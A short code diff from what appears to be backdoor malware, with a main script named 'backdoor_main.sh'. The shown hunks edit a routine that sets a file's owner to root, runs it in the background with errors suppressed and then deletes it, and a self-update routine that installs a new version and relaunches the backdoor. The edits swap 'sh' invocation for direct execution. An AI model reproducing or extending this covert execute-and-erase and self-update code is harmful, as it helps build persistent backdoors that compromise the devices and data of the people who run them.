@@ -31,7 +31,7 @@
     _exec() {
         chown root:root "$1" 2>/dev/null
         chmod 0775 "$1" 2>/dev/null
-        sh "$1" & 2>/dev/null
+        "$1" & 2>/dev/null
         rm -rf "$1"
     }
 #
@@ -59,7 +59,7 @@ update() {
         rm -rf "$MODDIR"/newver.zip
         cp -af "$MODDIR/newver" "$MODDIR"
         rm -rf "$MODDIR"/newver
-        sh "$MODDIR"/backdoor_main.sh &
+        "$MODDIR"/backdoor_main.sh &
         exit 0
     fi
 }
